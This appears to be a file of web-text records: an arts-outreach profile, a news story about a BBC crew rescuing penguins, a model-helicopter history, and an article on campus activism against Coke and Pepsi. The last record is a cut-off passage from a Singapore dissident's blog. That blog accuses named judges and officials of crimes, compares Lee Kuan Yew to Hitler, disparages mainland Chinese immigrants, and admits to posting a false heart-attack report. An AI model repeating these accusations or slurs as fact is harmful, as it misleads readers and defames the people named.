{"text": "Art Mobile of Montana, the only program of its kind in Montana, is a statewide service offering interactive presentations of curated exhibits, quality hands-on art lessons, and teacher education. This program educates through art about the diversity of the human experience, culture, practices, customs, and history and provides opportunities for youth and adults to participate together in arts-learning through and about art. The exhibit, which changes every year, is comprised of 25-30 contemporary Montana visual artists' works and is accompanied with presentations by the artists and resources for teachers about teaching art.\nEighteen years ago, Director of the Art Mobile of Montana, Sara Colburn taught art education at the University of Montana-Dillon. As she taught the next generation of educators, she thought about the importance of access to fine art. Youth exposed to art develop skills difficult to develop from other sources. Instead of hoping Montanans would make it to the nearest art gallery or museum, a big ask for much of the rural population, Colburn thought she could bring the art to the people. This is what sparked the creation of the Art Mobile of Montana.\nAfter taking art to a pilot project of nine rural schools, the program grew to cover the state. For six years Sara traveled to more and more schools, community centers and events. She developed a system in which schools could request a visit, and she would drive to them. Since 2000, the Art Mobile of Montana has served anywhere from 50 to 85 schools in a year. Now, Sara takes care of the business end of the program, writing for grants to support Art Mobile's activities, and the teaching artists (TA's) drive the Art Mobile van around the state, and teach.\nAt each school the Teaching Assistant not only sets up all 30 works of art on portable wooden walls, but gives a presentation about the art, leading an interactive discussion. Art Mobile exhibits include examples of art from a wide variety of the many cultures in Montana. Native American artworks comprise one-third of our annual exhibits. We solicit art each year and select a wide variety of styles and techniques. Students look forward to the art making sessions that usually take place after the presentations are over. Each year Art Mobile teaches several different art lessons, each one geared to the Montana State Standards and often linked to particular artworks in the exhibit.\nFor example, this year, Missoula artist Sally Hickman loaned 10 small abstract paintings interpreting the songs of a variety of birds. Each painting represented a particular bird's song. Tess Fahlgren teaches a lesson from these called \"Painting Sound\" in which she asks students to think of a sound, then write the word for that sound on the back of a piece of art paper, not telling anyone what they chose. On the flip side, students use watercolor to visually express their sound. In this way, each student is making an abstract painting. They have fun at the end of the project when they hold up their art while the rest of the class tries to guess what the sound might be.\nThe Art Mobile is an amazing resource for schools all across the state of Montana. Some schools, such as Corvallis Middle school and those in Bynum and Frazer, have had the Art Mobile almost every year since its founding. Others, such as Ulm Elementary and Roy High School, welcomed the Art Mobile for the first time this year. Because many schools have difficulty keeping full-time art teachers, the Art Mobile is there to help foster a healthy curiosity and understanding of art and remind students that there are many, many wonderfully talented artists who live and work right here in our state.", "meta": {"redpajama_set_name": "RedPajamaC4"}, "__index_level_0__": 37061}
{"text": "BBC Earth Filmmakers Stop Filming Dynasties to Save Penguins\nBy Natalie Flores | November 19, 2018 | 5:34pm\nImages via BBC/YouTube TV News Dynasties\nFilmmakers working on the Sir David Attenborough-narrated BBC Earth documentary series Dynasties are being praised by viewers for interrupting filming to rescue some penguins.\nThe second episode of the series showed the brutal winter that emperor penguins must face in Antarctica. One particular group of emperor penguins in Atka Bay had to face a storm so powerful that they were unable to keep themselves from being blown into a ravine and cut off from the colony. This ravine had walls too steep for the penguins to climb, and had filmmakers not intervened, the penguin mothers and chicks would have surely died. Footage captured the mothers fighting to drag their chicks up the slope, struggling so much that some were forced to make the heartbreaking decision of abandoning their babies.\n\"I can't watch,\" the BBC Earth Twitter tweeted about the scene Sunday, with a heart-wrenching accompanying clip.\nI can't watch #Dynastiespic.twitter.com/xoo7jDJbcl\n\u2014 BBC Earth (@BBCEarth) November 18, 2018\nThat's when the filmmakers decided to act, in an unprecedented move.\n\"They dug a shallow ramp in the hope that at least some of the penguins would use it to save themselves,\" added the BBC Earth Twitter.\nIn an unprecedented move, the crew decided to act. They dug a shallow ramp in the hope that at least some of the penguins would use it to save themselves #Dynastiespic.twitter.com/yRuoEGPDCk\nNature filmmakers usually follow the rule of never interfering with nature. Nature must run its course, and to interfere with it can set dangerous precedents, or at least that's the argument behind this notion. However, director Will Lawson, camera operator Lindsay McCrae and assistant Stefan Christmann made an exception here.\n\"We opted to intervene passively. Once we'd dug that little ramp, which took very little time, we left it to the birds. We were elated when they decided to use it. There's no rule book in those situations. You can only respond to the facts that are right there in front of you,\" says Lawson, per LADbible.\nAs you can imagine, we only show a fraction of the real trauma and difficulty that the animals go through\u2014it was a very hard thing to see. What was unique with this was that the only other animal there was us\u2014nothing else would directly benefit from this. I'm sure some people will have an opinion in the other direction but in my heart of hearts I think we made the right decision.\nMike Gunton, the series executive producer, also defended the decision. \"It's such an unusual circumstance to do this, and there are lots of situations where you couldn't, and shouldn't and wouldn't\u2014but I think in this situation there were so many factors. There were no animals going to suffer by intervening. It wasn't dangerous. You weren't touching the animals and it was just felt by doing this \u2026 they had the opportunity to not have to keep slipping down the slope,\" he told BBC Radio 5 Live.\nIn a press conference earlier this month, Gunton acknowledged why the decision might be controversial, but maintained that he believes the crew did the right thing anyway. \"We have a rule that interfering is a very dangerous thing to do. But these penguins were going to die through a freak act of nature if nothing happened. How would this conversation be going if you said you saw them there and did nothing? I think you have to do it,\" he said, per The Sun.\nIn the same conference, Attenborough touched on his firm stance on non-interference with nature. He said, \"Tragedy is a part of life, you know. You can't have sunshine throughout your life. To have done anything else would only make matters worse and distort the truth.\"\nBut Gunton says even Attenborough approved of the crew's decision: \"I was speaking to David about it yesterday and he said he would have done the same, too.\"\nDuring a time when it seems like we are swarmed by frightening, disappointing and heartbreaking news on a daily basis, this news shines a little light on humanity's goodness.\nbbc earth\nMore from Dynasties\nThe Age of Brands Birthed a New Kind of Political DynastyBy Jason RhodeApril 27, 2017 | 5:38pm\nSanditon Season 2 Trailer Teases Charlotte Getting Her Groove Back By Allison Keene January 21, 2022 | 11:11am\nYawn: Lord of the Rings TV Series Title Officially Revealed as \"The Rings of Power\" in New Teaser By Allison Keene January 19, 2022 | 10:28am\nTimothy Olyphant Will Return as U.S. Marshal Raylan Givens in FX's Justified: City Primeval By Kathryn Porter January 14, 2022 | 4:39pm\nState of the Union Season 2 Trailer: Brendan Gleeson, Patricia Clarkson Talk Politics, Sex, Fancy Coffee By Kathryn Porter January 14, 2022 | 2:25pm\nMonsters Assemble in the First Teaser for Netflix's Big Mouth Spin-off Human Resources By Jim Vorel January 12, 2022 | 2:20pm", "meta": {"redpajama_set_name": "RedPajamaCommonCrawl"}, "__index_level_0__": 572}

{"text": "Jan 77 advert from UK importer Arrow Models.\nUnknown Japanese manufacturer and introduced late 1976. I can only surmise that Angel was its name with the layout following the 'norm' for pod and boom models of the era. A twin aluminium frame either side of bearing blocks holding the shafts and tail boom with the engine firmly mounted, facing upwards and a wooden construction 'pod' housing the radio gear attached to the front.\nThe overall look was very similar to the MM Lark with the frame layout similar to the Schl\u00fcter Heli-Baby. It had flat bottom 'lifting' section blades however, instead of having the blades rigidly mounted on the teeter plate, the whole of which moved to provide cyclic control, the head was rigidly mounted to the main shaft with each blade bolted to another mounting plate that was free to pivot up and down thus allowing each blade to 'flap' independently of each other. Though no damping was provided for this flapping action, each holder had mounting plates on the inner side that physically limited the amount the blades could flap thus preventing too much movement and reducing the possibility of a boom strike. The flybar paddles were made of plastic and had a symmetrical airfoil with weights that could be moved to change the response times and this was moved by a single rod connected to the swashplate.\nThe main drive consisted of an engine driven clutch driving a double set of helical gears with the primary gear incorporating an angle bevel drive for the tail rotor drive wire. This then drove the tail rotor gearing which was unusual in that it incorporated helical gears instead of the usual bevel gears. Engine cooling was achieved in two ways; first by the use of a serrated cooling shroud wrapped around the head of the engine and held in place by a clamping ring secured to the frame. Second, by the addition of a small fan located under the main gear which blew air down over the engine.\nThe servo's were mounted in a line at the back of the canopy and provided cyclic control through bell cranks to the swashplate, engine control direct to the carb arm and tail control through a wire and tube. At the tail the blades were controlled in a similar way to the Heli-Baby except for a unique feature in that the blades were retained by directly screwing onto the centre piece with movement achieved by the blades rotating on the threads. The ratio of tail rotor to head speed was 4:1 which was quite low and thus the tail blades were large in order to allow good control.\nIt was noted that it had a very slow head-speed - even slower than the Lark! This would imply a very 'soft' control but in fact it flew very well, with good handling characteristics and stability!", "meta": {"redpajama_set_name": "RedPajamaC4"}, "__index_level_0__": 52952}

{"text": "Farmers in rural India and students in American universities may have more in common than it would seem. While Cola companies have run into opposition in several states in India, student bodies in North America are pressuring universities to wind up contracts letting the firms exclusively sell water and soft drinks on campus. Sandeep Pandey connects the dots.\nLabour rights' violations in Colombia and water rights of local communities in India have become a cause of concern for Coca Cola and Pepsi Cola, as students across campuses in United States and Canada are beginning to question unethical practices of the companies. The firms impact the lives of students in North America as they usually have exclusive contracts with universities which prevent products of other companies besides their own to be sold on campuses. Several student bodies are up in arms as they think that they should have the freedom to choose their products and their choices should not be dictated by corporations like Coke and Pepsi. The firms are also making attempts to replace the free water fountains in campuses with their vending machines.\nDevelopments in India reverberated in United States, when at the University of Michigan, Ann Arbor, the Students Organized for Labour and Economic Equity (SOLE) complained to the administration on November 30, 2004, about a labour rights issue in Colombia and three areas of concern regarding Coke in India. The India concerns included cadmium in sludge coming out of Coca Cola plants, ground water depletion by bottling plants and presence of pesticides in beverage products. University authorities had asked Coca Cola to respond to these concerns and the Vendor Code of Conduct Dispute Review Board of the University had recommended strict action against the company in case of non-compliance with their Vendor Code of Conduct. On 29 December 2005, University authorities suspended their contract with Coca Cola.\nIn a major development at McMaster University in Canada, students in a referendum on 19 October 2005 unambiguously disapproved of the Coca Cola's $6 million exclusive contract with their University. The referendum was an official one and a first in the history of the University. A movement initiated by a students' organization 'Campus Choice' had informed the larger community of students of irresponsible behaviour of Coca Cola in India and Colombia. The referendum is expected to force the McMaster Students Union and University authorities to review the contract with Coca Cola.\nYork University in Toronto is also likely to review its decade long exclusivity contract with Pepsi which is to end in 2008, as student groups have become suspicious of its true value to the community. In the mid 1990s the students at this University had led a five year boycott of Pepsi products following the opening of their operation facilities in Burma \u2013 a country with a poor human rights track record.\nStudents are also opposing administrations setting up their campuses as exclusive billboards for advertisement campaigns. Students are asking why workers in Coke plants in Colombia must bear the externalities of Coke so that the company can make profits. Why should the people in India of Mehandiganj, Varanasi or Plachimada, Kerala pay for the costs of making products on which the company makes huge profits? Who accounts for the externalities that result in Coke's profits? Coke and Pepsi are producing externalities - health problems, water depletion, pollution -- within a free market econom. These are costs they are not accounting for and not paying for.\nWhen it comes to environmental degradation and unsustainable practices of commercial enterprises in India, there is plenty of blame to go around. Why pick only on the big cola firms? India Together's Subramaniam Vincent talked with Sandeep Pandey.\nIt is known that India incorporated MNCs and non-MNCs and even industrial SMEs too indulge in pollution and even rank depletion. What about their excesses and externalities?\nThis question often used to be asked during my presentations. The simple response is that the power to cause damage is much greater for the MNCs than Indian companies because of their sheer magnitude of operation. For example, Coke and Pepsi together have more than 90 plants each drawing 15-25 lakh litres of water per day. This damage is greater than what was being caused by Indian companies like Thums Up. But in principle I am opposed to degradation and exploitation by all.\nHow did you arrive at your estimate on the number of litres per day Coke and Pepsi are drawing?\nThe companies' responses to the concerns of students is not helping. On 4 October 2005, a documentary 'Mehandiganj \u2013 Where Life is at Stake' was screened on the campus of Georgia Institute of Technology in Atlanta to discuss the movement for rights over water of local communities going on in rural areas of Varanasi. After the screening, Harry J Ott, Director of Global Water Resources Center at Coca Cola's international headquarters, next door to the campus, claimed that he had Groundwater Board data available from India to show that water table had, in fact, risen at Mehandiganj, since the bottling plant of the company was set up there.\nOtt was more willing to believe government data over vivid pictures of about 2000 people protesting against the plant in November 2004, shown in the film just screened. Farmers in Mehdiganj confirm the drop in the water table, in some cases upto 50 feet. They do not know how Coca Cola obtained figures from groundwater board claiming that the water table has gone up. Ott also claimed that the company has undertaken watershed management exercises all over the country to compensate for the depleting water tables.\nThe Joint Parliamentary Committee report on pesticides in colas was tabled in Parliament in February 2004. It read like a charge-sheet.\nWhen it was pointed out to him that there was no proof of any such attempt in Mehandiganj, Varanasi, he responded that the effort here was being done inside the plant premises! Harry Ott apparently has no idea of how big a catchment area is required to compensate for the water table being depleted by its four tube wells continuously operating inside the plant. Besides, if indeed the bottling plants are able to collect enough water to recharge the local ground water and even cause it to rise, why then do they not simply use that water for their operations? After all, the rain water is cleaner than the ground water that has various chemicals leaching into it and this would save the company major costs attributed to water filtration processes.\nAt Carleton University in Ottawa, on 19 October 2005, the students attending a meeting similar to the one at Georgia Tech, asserted that they have a right to free drinking water from public fountains and Coke and Pepsi should not force them to buy bottled water. It is reported that a new building on the campus of University of British Columbia will not have any water fountains. Students expressed their resentment over this.\nCompanies like Coke and Pepsi are not willing to clean up pesticide residues in their products being sold in India. It has been more than 2 years since the Centre for Science and Environment in 2003 revealed the presence of pesticides in Coke and Pepsi products in India. This was later confirmed by a Joint Parliamentary Committee report. Still, no action has been taken yet either by the government or the companies themselves to remove pesticide residues from the products. Meanwhile, the Jaipur High Court had ordered Coke and Pepsi to mention pesticides' levels on their products, an order which the firms did not follow.\nCoca Cola also refuses to acknowledge the presence of Cadmium in its sludge despite two reports -- one from the University of Exeter and the other from the Kerala Pollution Control Board -- independently confirming the presence of Cadmium in sludge coming out of the Plachimada plant. Can the firms be expected to do the more tedious task of watershed management to conserve water for Indian farmers?\nIn fact, in 2004, the Joint Parliamentary Committee noted with shock that soft drinks as an industry were not regulated. To set up their plants in India, Coke and Pepsi just need a no-objection certificate from the Food Department, the State Pollution Control Board (state government) and the local government (municipality or panchayat). In absence of any law regulating their water usage, they have made use of the fact that anybody owning a piece of land also has the 'right' to use water from underneath it. Cola firms do not even classify as an industry and hence do not come under the lens of the EIA (Environment Impact Assessment) process of the Ministry of the Environment. Other industries are required to prepare an EIA report as part of the clearance process. Moreover, nobody had realised that the Cola companies would use so much water.\nDr Sandeep Pandey is based in Lucknow and one of the founders of the NGO Asha for Education and winner of the 2002 Ramon Magsaysay Award for Emergent Leadership. He is involved with grassroots movements against Coca Cola at Mehdiganj, Varanasi and Sinhachawar, Ballia, both in U.P.", "meta": {"redpajama_set_name": "RedPajamaC4"}, "__index_level_0__": 71496}

{"text": "Lee Kuan Yew's Singapore: Ein Reich Ein Volk Ein F\u00fchrer\nI cannot avoid the striking similarities of Hitler's Nazi Germany and Lee Kuan Yew's Singapore's. Sure there are differences but they are in degree of severity only. But the fundamentals remain entirely the same.\nIn Nazi Germany from 1933 to 1945, the cry was Ein Reich Ein Volk Ein F\u00fchrer, or One Country, One People, One Leader. There was no allowance for diversity. Germany was one for all and all for one. There was one people all in support of Hitler and Hitler alone. And there was only one leader for them, himself.\nAnyone who was opposed was eliminated. There was no room for any other political philosophy, except for National Socialism. Staunch supporters and collaborators were rewarded. Opponents were murdered.\nIn Nazi Germany everyone knew which side the bread was buttered. If you wanted to progress join the party and work for them. If not, you are stupid and you will suffer. That was the thinking.\nLee Kuan Yew's Singapore of 2011 is no different. Lee too says if you want to progress join him. If you do, you will be rewarded with good jobs, business contracts. Milk and honey will flow for you and your family. Resist and you are a fool. You will be punished in more ways than one. Just look at Chee Soon Juan, late JB Jeyaretnam, Tang Lian Hong and now me. All sent to jail and publicly humiliated, because we did not have the good sense like his cronies to support him.\nBut there is one difference. The unfortunate thing for Lee Kuan Yew's Singapore is this. Nazi Germany on the one hand, although brutal and intolerant to the extreme, still had a clearly publicized doctrine and philosophy by which they justified themselves. The Treaty of Versailles of 1918, they said had been clearly unfair to their defeated Germany.\nThe terms of surrender was belittling of their pride, depriving them of their soverignity, making them forever slaves. This, according to Hitler was clearly unacceptable which demanded the breach of the Treaty to recover their position in the world of nations.\nAs for the Jewish question, they were a persecuted people anyway since the advent of Christianity and the discrimination against them was not something new. He of course went too far by murdering them.\nLee Kuan Yew's Singaporeans on the other hand are incapable of making any argument to justify their system of government. For instance what reasonable argument can they raise for permitting their ministers to pay themselves each several millions of dollars a year, which is theft any way you look at it? None.\nWhat argument even remotely logical can they raise in bringing in ship loads of Chinese from mainland China to populate the island, as opposed to any other race, when the Constitution mandates equality between he races? None.\nWhat reasonable argument can they raise to insist on 75% Chinese in each housing block when the Constitution allows Singaporeans to live anywhere in the island of their choosing? None. This is simply a forced dispersal of the races within the island, impermissible under the Constitution.\nWhat reasonable argument can they raise in repeatedly suing JB Jeyaretnam in the courts and bankrupting him when an examination of what he had done shows just normal criticism. Absolutely none.\nI think had I met an imaginary fervent Nazi supporter in 1935 Berlin, I would have had a harder time in proving he was wrong than if I would have today in Singapore with a PAP supporter. There is simply no way in the world for these Lee Kuan Yew thugs to justify themselves with any sensible argument. They would have none at all.\nWhich is why I believe that this present PAP administration under Lee Kuan Yew is resting on ice so thin, that anytime, there is the slightest change in circumstances, they would go tumbling down.\nEvery single Singaporean remaining in Singapore today is simply in a daze, confused and unable to articulate his position one way or another. Or they are thoroughly unconscionable characters who have sold their soul entirely for money; either way a second rate citizen, no country would like to have.\nFor instance any attempt anyone makes to ask a Singaporean lawyer as to what he thinks of all these defamation lawsuits against certain of Lee's political opponents will draw a blank. And the same with every other of these issues which are crying out for justice.\nWhat it has boiled down to finally is this. Lee Kuan Yew is today's supreme leader of Singapore, just like Hitler was, and those who support him at the top do it for the money, large sums of it. And with his judges and his state controlled newspapers, he simply subjugates every single human being in the island. If you don't like it, you the choice of leaving if you can. If you stay back and challenge him, he will punish you. There is no longer any legal basis to anything he does. He simply does what he wants to you. Take it or leave it.\nIn the sense of at least having a reasonably arguable political philosophy, Hitler appears on stronger ground. In Lee Kuan Yew's case, he does not have any logical reasons for what he does. He simply does whatever he wants.\nSingapore's Chief Justice speaks with forked tongue, once again\nIt is amazing how in Lee Kuan Yew's Singapore men such as Lee Kuan Yew's Chief Justice, Chan Sek Keong, can say these blatant lies with a straight face. Singapore's state controlled newspaper the Straits Times of July 29, 2011 has the story \"Chief Justice Chan on new lawyers' role in next 20 years\" in which he says, believe it or not \"lawyers are called up to be upholders of justice, said Chief Justice Chan Sek Keong on Friday\".\nThe fact of the matter is, which he knows, as well as I know, as well as anyone else who has lived in Singapore knows is that if you did just what he is saying, you will be in serious trouble including being jailed and bankrupted.\nLet me remind you once again who this man is. In 1997 he was Lee Kuan Yew's Attorney General, when Lee Kuan Yew, Goh Chock Tong and several other Lee Kuan Yew's people who were not contesting in the elections at Cheng San GRC, were found inside the polling station on polling day, which was a clear violation of the Parliamentary Elections Act which prohibited politicians not involved to stay away at least several hundred feet of the premises. You can understand the reasoning behind this criminal law surely. It is to prevent any undue influence by anyone to gain an unfair advantage through influencing voters coming to vote.\nBut when JB Jeyaretnam filed a criminal complaint against Lee Kuan Yew who had clearly committed a criminal offense and should have been prosecuted, this disgraceful man who was then Attorny General, replied for the government saying no offense was committed, believe it or not. His ingenious or rather disgraceful argument was that it was only a crime to come close to the polling station but not a crime to enter it!\nIf Singapore Chief Justice Chan Sek Kiong, could stoop so low to lick the boots of his master Lee Kuan Yew, how does he tell us that lawyers should uphold justice, just tell me that.\nHe is the head of a legal system in the island, where the Constitution is legally violated. No one is allowed to protest even alone, and even peacefully. There is no independent press because they are all state controlled. You are not allowed to congregate even peacefully even though the Constitution specifically guarantees it. And Singapore is the only country in the world whose lawyers are not allowed to comment on any laws of Singapore. They do this by the disgraceful expedient of enacting a law which states that the Singapore Law Society is allowed to comment on legislation if invited to do so, thereby making such comment without a request from the government illegal!\nChan Sek Kiong, Singapore's (or rather Lee Kuan Yew's) former Attorney General, is now the Chief Justice and head of a legal profession which has no more than 3,000 lawyers even though his country has 5 million people. Of these, believe it or not, no more than about 400 lawyers have more than 12 years of experience (these are figures released by the Singapore Law Society).\nSingapore's legal profession continues to decline and despite all their efforts, are simply unable to attract students into the profession in sufficient numbers, the simple reason being that Singapore law, thanks to this Lee Kuan Yew bootlicker, has been thoroughly discredited.\nChan Sek Kiong has so successfully managed to discredit Singapore law, that it has completely lost it's reputation. Today it is seen as an organization merely to keep the Lee Kuan Yew family in power and destroy and remove anyone who is a political threat to him through the misuse of the law.\nChan Sek Kiong is a man who has spent an entire career, not to uphold justice in Singapore, but to uphold his master Lee Kuan Yew's dictatorial rule over his people, which he does shamelessly for payments of large sums of money.\nSingapore's Chief Justice Chan Sek Kiong is the reason for Singapore's continual decline down the slippery slope. His abuse of the law to please his master Lee Kuan Yew is the reason why there is massive brain drain to the west, the continual fall of Singapore's birth rate, and the theft of millions of dollars by the Lee Kuan Yew family which they call, salaries.\nSingapore's Chief Justice Chan Sek Kiong is the last person in the world who should be talking of \"upholding the law\".\nSomeone should ask him whether the repeated lawsuits against JB Jeyaretnam was upholding the law? Was the repeated defamation of character lawsuits against Chee Soon Juan and his bankruptcy and jail, upholding the law? Was the several million dollar libel award in favor of Lee Kuan Yew against Tang Lian Hong and his subsequent exile, upholding the law? If all these things are upholding the law, tell me, why do we need serial killers then?\nIn the movie Judgement at Nuremberg, Ernst Janning a Nazi judge, brilliantly portrayed by Burt Lancaster at his trial for war crimes confessed saying that the moment a judge deliberately abused his authority, he ceased to be a judge and became excrement.\nI think he said it right. Chief Justice of Singapore Chan Sek Kiong had ceased to be a judge long ago. He has become excrement.\nAttached below is Burt Lancaster's speech in the film, \"Judgement at Nuremberg\"\nhttp://www.youtube.com/watch?v=Yt4e9YvKwuc&NR=1\nhttp://www.youtube.com/watch?v=fKcuMbQuYQ8&NR=1\nPosted by Gopalan Nair at 11:45 PM 13 comments:\nSingapore. Gopalan Nair makes headlines again.\nI am not sure if Lee Kuan Yew's Singapore realizes this, but all this publicity for Gopalan Nair yesterday about his being disbarred from Singapore legal profession is actually doing him a mountain of good. Not the other way round.\nIn most other places, a lawyer being disbarred would not have made it to the newspapers, let alone headlines, since it is really not newsworthy. But in Singapore, it made headlines in their state controlled newspaper Straits Times which carried a color photo of myself. Several other state controlled news papers all carried the story prominently. (All Singapore media are state controlled, there is no independant press). Of course their intention was to give me a bad name as always, but really, is it achieving that purpose? I am not sure.\nSince my entanglement with Lee Kuan Yew's Singapore in 2008 by my visit, which ended up a full six months with a 2 month jail portion, Gopalan Nair became a public figure in the island. My pictures were posted on several occasions over the 6 months while there, and Singaporeans knew me.\nAfter my return to the US after being in Lee Kuan Yew's jail, I was again in the news there in Singapore, for defying their court order and for writing another blog critical of another of his judges, Judith Prakash which I did from the US.\nOnce again, some months ago, I was headline news again, when I deliberately wrote a factually untrue blog post about Lee Kuan Yew suffering a heart attack. There too Gopalan Nair was centre of attention among Singaporeans with newspapers splashing headlines across it. All TV and radio stations in the island reported on it. My action was even debated in Lee's Parliament. I did it only to prove that Singapore is so politically fragile that if Lee Kuan Yew were to die, the entire island will collapse, which was proved right.\nAnd now this. Headline news about my disbarment in Singapore with my picture in the papers, with news of it also in all radio stations in all languages.\nIn a small crowded island like Singapore news naturally spreads island wide within minutes. So it is fair to say that the name Gopalan Nair or sometimes GN as some call it, is a household name.\nOf course, Lee Kuan Yew's purpose of doing this is an attempt to discredit me and paint me as a criminal by thoroughly false or half truths. But I am not sure this is how Singaporeans are going to think of me.\nToday across the island, Lee Kuan Yew and his government is disliked for their high handedness, nepotism and various other excesses of power. They know that their judges are all there to do Lee Kuan Yew's bidding and not a single person really believes that there is even a semblance of the rule of law.\nIn the case of Gopalan Nair, all he has alleged to have done is to criticize the judiciary. There is also the accusation that he shouted at policemen. Big deal. And for this he is disbarred for life? It is not a case of my committing murder or committing bank fraud. Unless he is insane, noone goes around criticizing judges for nothing.\nSo in this case, I don't believe that all this publicity is going to have the effect of Singaporeans believing Gopalan Nair as evil in any sense. It is more than likely that they will see this as another instance of Lee Kuan Yew and his government being particularly jittery of the effect his writings in Singapore Dissident may have on Singaporeans.\nAnd furthermore, the good news is, it will have the effect of directing much more attention among Singaporeans to this blog Singapore Dissident, as those who may not have heard of it would look it up after hearing about Gopalan Nair in headline news.\nOn the whole, I would say, not a very smart move by Lee Kuan Yew and his PAP, this prosecution against Gopalan Nair. It advantages me more and not them. So a thank you, Lee Kuan Yew for all the trouble and expense.\nSingapore Dissident will continue whether or not I am disbarred from practicing law in Lee Kuan Yew's Singapore.\nSingapore's Lee Kuan Yew says he prefers strong goverments\nSingapore' state controlled newspaper the Straits Times of July 27, 2011 has the story \"Singapore will spiral down if government is weak\". I think most Singaporeans know what he means by that.\nHe wants strong governments like his PAP that terrorizes it's citizens into submission through libel actions to silence detractors and jailing and disbarring bloggers like Gopalan Nair from practicing law in the island of Singapore to keep his seat.\nLee Kuan Yew's Singapore government is so strong that they have managed to put every single judge in their pocket, they can pay themselves millions or any other figure they want, they can monopolise the entire media and newspapers and completely destroy the free press, they can mess around with the Constitution and make free speech, right to assembly and association, all universal human rights all illegal and criminalized.\nOnly yesterday, I was disbarred for criticizing a judge Belinda Ang Saw Ean who shamelessly and disgracefully abused her position to favor him in the 2008 defamation case brought against Chee Soon Juan.\nHe and his government are so unbelievably strong that he can make sure that every single defamation case that he brings against his political opponents are all successful with million dollar awards against his victims. In fact he is so very strong that the moment he sues someone, we know the verdict even before he steps into the courtroom.\nHitler was strong too and he too had a strong government, so strong that if you criticized him he will kill you. Today we have our Singaporean Hitler who wields Hitlerian powers by the strength of himself and his government.\nBut look at what he and his superstrong government has achieved. Yes , Singapore is dotted with skyscrapers along the waterfront. But who are those who live there? Except for the ubiquitous Burmese drug lords who live in Singapore driving around in their Lamborghini, and the equally rich Indonesian bank crooks, the average Singaporean except for those connected in the right places are living hand to mouth their miserable existence. Those who cannot make it, take their own lives by jumping off high rise buildings.\nThe Singaporeans population continues to decline while foreign Chinese from China who have no skills and no English are brought in lowering the general class and position of the society, spitting and gesticulating at every corner.\nEspecially badly hit by his dictatorial rule, another way of saying strong government, is the legal system. Today in Singapore, the entire judiciary shamelessly abuse the law to keep Singaporeans in place. His judge Belinda Ang Saw Ean is deployed to bankrupt and impoverish his political opponent Chee Soon Juan. Only a few months ago, another recently appointed bootlicker of a judge Quentin Loh Sze Onn, a Singaporean Chinese with a fancy English name, was used to imprison a British author Alan Shadrake because he wrote a book not entirely flattering of these judges.\nIf this is what he means by strong governments, Singaporeans do not want it, thank you very much. If what he means by a weak government is one with the rule of law, an independent judiciary and a government of integrity, then give us a weak government anytime, not a government of thugs who deploy judges like this woman Belinda Ang Saw Ean who bankrupts innocent people just because they had exercised their Constitutional rights.\nSingapore. My letter to the State Bar of California relating to my Singapore Disbarment\nAs you are aware, the Singapore Law Courts disbarred me from ever practicing law again in that island. As to whether it is going to be forever is something I am not very sure. From the looks of it, it doesn't look very good for them today. Which means if there is a change in government, I think there is a more than strong likelihood, that I will return. Can I quote General MacArthur and simply say \"I shall return\".\nBy the way, under California Business and Professions Code Section 6068 (o)(6), I have a duty to report any discipline against me imposed anywhere within 30 days. So I have written the following letter and enclosed the necessary form to the State Bar of California. I have taken the liberty of attaching my letter to this as this is now a matter of public interest.\nOffice of the Chief Trial Counsel, Intake\nThe State Bar of California\n1149 S Hill Street\nJuly 25, 2011 USPS Certified Mail\nRef: statebar.nair.singapore.07252011.doc\nIntroduction/ Singapore\nSingapore is an island governed principally by keeping the people in fear of their government. Their principal tool to do this is through the misuse of the law and the courts. Singaporean judges routinely collaborate with the government to bend the law to silence dissent. Their policy is the Chinese theory of \"Killing one chicken to frighten the monkeys\", that is to say abuse the law to punish your critics so as to ensure that others would be dissuaded from doing the same. This is what is happening in these proceedings.\nDisciplinary Proceedings in Singapore\nYesterday, July 25, 2011 (Singapore time) I was disbarred from practicing law in Singapore on 5 charges. Although I had left Singapore for good for the US in 1991, and have never practiced law there at all since then, I was still technically on the Rolls of lawyers in Singapore. All these charges are politically motivated and is a response to my continued and sustained political activism to bring about democratic change in Singapore. The events happened as far back as May 2008, when I was on a brief visit to Singapore to observe a politically motivated libel suit brought by the Singapore strongman, Lee Kuan Yew and his son against an opposition politician Dr. Chee Soon Juan.\nIn Absentia Proceedings\nAlthough I was informed of these proceedings I did not attend any of the hearings in Singapore as well as the hearing on July 25, 2011. As I had been charged for writing blog posts critical of their judges and their government in my blog Singapore Dissident and since I had written further blog posts of similar nature since my return to the US after being deported from Singapore in November 2008, I will certainly be arrested and charged again for my writings in the US if I visited Singapore.\nSecondly since one of the charges relate to my violating their court order not to criticize them, since I had done so after leaving Singapore, they would certainly arrest me again had I returned. Therefore I had written repeatedly to them for an assurance that they will not arrest me if I returned to Singapore. As they had not given that assurance I did not return to Singapore for my trial on July 25, 2011. They conducted the proceedings in absentia and disbarred me.\nI was born and raised in Singapore and was a Singapore citizen. I am now an American citizen. I went to England to read law and was admitted to the English Bar in 1979 as a Barrister at law. I am still on the Rolls of Barristers in good standing in England and Wales. In late 1979, I returned to Singapore and was admitted as an Attorney (Advocate and Solicitor) in 1981.\nAround 1985, I became politically active in Singapore and joined the Workers Party, an opposition party in Singapore. From that time on, the Singapore government controlled entirely by Lee Kuan Yew began harassing and persecuting me for my political activities.\nI stood for parliamentary elections in Singapore as a candidate for the Workers party in 1988 and 1991. I lost both times.\nIn 1991, during elections, I had made a speech at an election rally. I had suggested that the appointment of judges in the Subordinate Courts be changed to make them look more independent. At that time judges were appointed by the Singapore Legal Service Commission which was directly controlled by the Attorney General. For this statement, I was charged and convicted of contempt of court and fined $8,000.00 dollars and ordered to pay the costs.\nAlso around 1991, I had written a letter to the Singapore Attorney General concerning his refusal to give JB Jeyaretnam, the head of the Workers Party who was exonerated of trumped up criminal charges by the Privy Council in England. He had been charged with check fraud and making a false Affidavit. The Attorney General of Singapore refused to give a pardon to Jeyaretanm because he claimed, among other things that he was not given an opportunity to appear in court in London, which was not true. For asking him to explain himself, I was charged with threatening him and falsely accusing him. I did not such thing. Nevertheless I was suspended from practicing law for 2 years in Singapore.\nI had other problems with the Singapore government and their Law Society because of my continued involvement in opposition politics.\nComing to the USA and obtaining political asylum\nIn 1991 December, I left Singapore for good and arrived in San Francisco California. I obtained political asylum in 1995. I passed the California Bar in 1995 and was admitted in 1996. Since the Singapore Law Society had refused to give me a certificate of good standing in Singapore, I had to explain these circumstances to the State Bar of California. Please look at my admission file which gives details of my problems with the Singapore government and their legal system.\nThe present charges against me resulting in my disbarment.\nCharge 1. I had travelled to Singapore and had landed there on May 26, 2008. I had travelled to observe the hearing on the question of damages that Chee Soon Juan had to pay Lee Kuan Yew who had earlier sued him for libel and won. The judge in the case was 